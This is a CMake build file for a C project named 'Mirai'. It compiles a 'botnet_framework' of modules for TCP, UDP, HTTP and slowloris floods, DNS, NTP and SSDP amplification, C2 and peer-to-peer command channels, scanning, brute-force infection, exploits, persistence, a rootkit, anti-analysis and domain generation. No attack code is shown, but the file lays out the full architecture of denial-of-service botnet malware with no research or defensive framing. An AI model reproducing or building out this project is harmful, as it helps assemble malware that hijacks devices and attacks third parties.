cmake_minimum_required(VERSION 3.10)
project(Mirai C)

set(CMAKE_C_STANDARD 99)

# Force rebuild
include_directories(botnet_framework/include)

# Explicitly list all source files to avoid any GLOB issues.
set(SOURCES
    botnet_framework/src/core/main.c
    botnet_framework/src/core/botnet.c
    botnet_framework/src/core/controller.c
    botnet_framework/src/core/scheduler.c
    botnet_framework/src/core/signal_handler.c

    botnet_framework/src/attack/attack_manager.c
    botnet_framework/src/attack/tcp_flood.c
    botnet_framework/src/attack/udp_flood.c
    botnet_framework/src/attack/http_flood.c
    botnet_framework/src/attack/slowloris.c
    botnet_framework/src/attack/multi_vector.c
    botnet_framework/src/attack/amplification/dns_amp.c
    botnet_framework/src/attack/amplification/ntp_amp.c
    botnet_framework/src/attack/amplification/ssdp_amp.c

    botnet_framework/src/communication/c2_client.c
    botnet_framework/src/communication/p2p_network.c
    botnet_framework/src/communication/protocol.c
    botnet_framework/src/communication/encryption.c
    botnet_framework/src/communication/heartbeat.c
    botnet_framework/src/communication/reporting.c

    botnet_framework/src/infection/scanner.c
    botnet_framework/src/infection/brute_force.c
    botnet_framework/src/infection/exploit.c
    botnet_framework/src/infection/persistence.c
    botnet_framework/src/infection/infection.c

    botnet_framework/src/stealth/anti_analysis.c
    botnet_framework/src/stealth/process_hiding.c
    botnet_framework/src/stealth/network_stealth.c
    botnet_framework/src/stealth/cryptography.c
    botnet_framework/src/stealth/cleanup.c
    botnet_framework/src/stealth/stealth.c
    botnet_framework/src/stealth/aes.c
    botnet_framework/src/stealth/rootkit.c

    botnet_framework/src/utils/network_utils.c
    botnet_framework/src/utils/dga.c
    botnet_framework/src/utils/logging.c
)

# Define the executable target
add_executable(Mirai ${SOURCES})

# Link against the pthreads library
target_link_libraries(Mirai PRIVATE pthread)

# Optional: Add compiler flags for better warnings
target_compile_options(Mirai PRIVATE -Wall)
